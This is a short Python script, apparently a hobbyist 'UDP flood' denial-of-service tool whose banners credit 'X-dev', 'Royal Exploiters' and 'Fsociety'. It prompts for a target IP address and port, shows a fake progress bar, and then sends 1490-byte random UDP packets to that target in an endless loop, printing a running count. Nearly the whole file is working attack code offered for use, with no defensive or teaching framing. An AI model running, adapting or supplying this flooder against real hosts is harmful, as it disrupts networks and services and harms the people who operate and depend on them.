import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system
os.system
print
os.system("echo -e '[+]Coded by X-dev \n      '|lolcat ")
os.system("echo -e '[+]Owner Of Royal Exploiters \n     '|lolcat ")
os.system("echo -e '[+]Powered by Fsociety \n     '|lolcat ")
os.system("echo -e '______________________________________________________________ \n     '|lolcat ")
print
ip = input("IP Target : ")
port = int(input("Port       : "))

os.system("clear")
os.system("echo 'attack Starting at >> '|lolcat")
os.system("date|lolcat")
print( "[                                                      ] 0% ")
time.sleep(2)
print ("[================                                      ] 25%")
time.sleep(2)
print ("[===============================                       ] 50%")
time.sleep(2)
print ("[==============================================        ] 75%")
time.sleep(2)
print ("[======================================================] 100%")
time.sleep(2)
sent = 0
while True:
     try  :
      try :
       sock.sendto(bytes, (ip,port))
       sent = sent + 1 
     #port = port + 1
     
       print ('\033[1;32mSent '+str(sent) +' packet to ' +str(ip) + ' throught port ' + str(port)) 
       if port == 65534:
         port = 1
      except KeyboardInterrupt :
       print("\033[31m \n Proccess  canceled by user")
       break ;  
     except :
      try :
       print("\033[1;31mno connection. invalid host name or server may be down \n")
       print("\033[1;31m press ctrl+c to  exit \n")
       break ;
      except KeyboardInterrupt :
       print("\033[1;31m \n Proccess  canceled by user \n")
       break ;
     
